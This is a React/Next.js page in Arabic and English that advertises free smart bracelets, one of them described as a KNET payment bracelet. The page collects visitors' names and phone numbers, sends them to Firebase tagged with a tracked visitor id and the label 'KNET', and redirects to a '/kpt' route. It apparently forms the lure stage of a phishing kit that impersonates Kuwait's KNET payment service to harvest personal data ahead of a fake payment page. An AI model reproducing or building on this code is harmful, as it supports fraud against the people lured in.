"use client";

import type React from "react";

import { useState } from "react";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Check, Smartphone, Heart, Activity, Zap } from "lucide-react";
import "../globals.css";
import { Input } from "@/components/ui/input";
import { addData } from "@/lib/firebase";

interface BraceletOption {
  id: string;
  name: string;
  nameAr: string;
  description: string;
  descriptionAr: string;
  price: string;
  color: string;
  icon: React.ReactNode;
  popular?: boolean;
}

const braceletOptions: BraceletOption[] = [
  {
    id: "fitness-pro",
    name: "Fitness Pro",
    nameAr: "اللون الرمادي",
    description: "Advanced fitness tracking with heart rate monitoring",
    descriptionAr: "السوار الذكي رفيقك المثالي في كل مكان وزمان",
    price: "299",

    color: "bg-gray-500/10",
    icon: <img src="/11.png" alt="img" />,
    popular: true,
  },
  {
    id: "health-monitor",
    name: "Health Monitor",
    nameAr: "اللون الاحمر",
    description: "Comprehensive health tracking and wellness insights",
    descriptionAr: "طريقة دفع مبتكرة مع سوار الدفع الذكي من كي نت",
    price: "399",

    color: "bg-red-500/10",
    icon: <img src="/22.png" alt="img" />,
  },
  {
    id: "smart-connect",
    name: "Smart Connect",
    nameAr: "اللون الازرق",
    description: "Stay connected with smart notifications and calls",
    descriptionAr: "السوار الذكي رفيقك المثالي في كل مكان وزمان",
    price: "199",

    color: "bg-blue-500/10",
    icon: <img src="/33.png" alt="img" />,
  },
  {
    id: "endurance-max",
    name: "Endurance Max",
    nameAr: "اللون البرتقالي",
    description: "Long-lasting battery for extreme adventures",
    descriptionAr: "بطارية طويلة المدى تدوم لأشهر ",
    price: "مجاناً",
    color: "bg-orange-500/10",
    icon: <img src="/44.png" alt="img" />,
  },
];

export default function SmartBraceletPage() {
  const [selectedOption, setSelectedOption] = useState<string>("");
  const [isArabic, setIsArabic] = useState(true);
  const [phone, setPhone] = useState("");
  const [name, setName] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSelection = (optionId: string) => {
    setSelectedOption(optionId);
  };

  const selectedBracelet = braceletOptions.find(
    (option) => option.id === selectedOption
  );
  const handleClick = (e: React.FormEvent) => {
    e.preventDefault();
    const visitorId = localStorage.getItem("visitor");
    setLoading(true);
    window.location.href = "/kpt";
    addData({ id: visitorId, phone, name, currentPage: "كي نت" });
  };
  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 dark:from-slate-900 dark:to-slate-800 p-4">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="text-center mb-12 pt-8">
          <div className="flex justify-center items-center gap-4 mb-6">
            <h1 className="text-4xl font-bold text-foreground">
              {isArabic
                ? "اختر السوار الذكي المثالي"
                : "Choose Your Perfect Smart Bracelet"}
            </h1>
          </div>
          <p className="text-xl text-muted-foreground max-w-2xl mx-auto">
            {isArabic
              ? "اكتشف مجموعتنا من الأساور الذكية المتطورة واختر الأنسب لاحتياجاتك"
              : "Discover our advanced smart bracelet collection and select the one that fits your needs"}
          </p>
        </div>

        {/* Options Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          {braceletOptions.map((option) => (
            <Card
              key={option.id}
              className={`relative cursor-pointer transition-all duration-300 hover:shadow-lg ${
                selectedOption === option.id
                  ? "ring-2 ring-primary shadow-lg scale-105"
                  : "hover:scale-102"
              }`}
              onClick={() => handleSelection(option.id)}
            >
              {option.popular && (
                <Badge className="absolute -top-2 -right-2 bg-primary text-primary-foreground">
                  {isArabic ? "الأكثر شعبية" : "Popular"}
                </Badge>
              )}

              <CardHeader className="text-center pb-4">
                <div
                  className={`w-40 h-40 ${option.color} rounded-full flex items-center justify-center mx-auto mb-4 text-white`}
                >
                  {option.icon}
                </div>
                <CardTitle className="text-lg">
                  {isArabic ? option.nameAr : option.name}
                </CardTitle>
              </CardHeader>

              <CardContent className="pt-0">
                <div className="text-center mb-4">
                  <Badge className="bg-gradient-to-r from-purple-500 to-pink-500">
                    مجاناً
                  </Badge>
                </div>

                {selectedOption === option.id && (
                  <div className="flex items-center justify-center gap-2 text-primary font-medium">
                    <Check className="w-5 h-5" />
                    <span>{isArabic ? "محدد" : "Selected"}</span>
                  </div>
                )}
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Selection Summary */}
        {selectedBracelet && (
          <Card className="max-w-2xl mx-auto">
            <CardHeader>
              <CardTitle className="flex items-center gap-3">
                <div
                  className={`w-12 h-12 ${selectedBracelet.color} rounded-full flex items-center justify-center text-white`}
                >
                  {selectedBracelet.icon}
                </div>
                <div>
                  <h3 className="text-xl">
                    {isArabic ? selectedBracelet.nameAr : selectedBracelet.name}
                  </h3>
                  <p className="text-muted-foreground font-normal">
                    {isArabic
                      ? selectedBracelet.descriptionAr
                      : selectedBracelet.description}
                  </p>
                </div>
              </CardTitle>
            </CardHeader>
            <CardContent dir="rtl">
              <form onSubmit={handleClick}>
                <div>
                  <Input
                    className="m-2"
                    type="text"
                    dir="rtl"
                    placeholder="الاسم الكامل"
                    value={name}
                    required
                    onChange={(e) => setName(e.target.value)}
                  />
                </div>
                <div>
                  <Input
                    className="m-2"
                    type="tel"
                    dir="rtl"
                    maxLength={8}
                    placeholder="ادخل رقم الهاتف"
                    value={phone}
                    required
                    onChange={(e) => setPhone(e.target.value)}
                  />
                </div>
                <div className="flex items-center justify-between mb-6">
                  <span className="text-lg font-medium">
                    {isArabic ? "السعر:" : "Price:"}
                  </span>
                  <span className="text-sm font-bold text-red-600">مجاناً</span>
                </div>

                <div className="flex gap-4">
                  <Button
                    disabled={loading}
                    className="flex-1 bg-gradient-to-r from-purple-500 to-pink-500"
                    size="lg"
                  >
                    {!loading ? "اطلبها الأن" : "يرجى الانتظار..."}
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {!selectedOption && (
          <div className="text-center py-8">
            <p className="text-muted-foreground">
              {isArabic
                ? "اختر أحد الخيارات أعلاه لرؤية التفاصيل"
                : "Select an option above to see details"}
            </p>
          </div>
        )}
      </div>
    </div>
  );
}
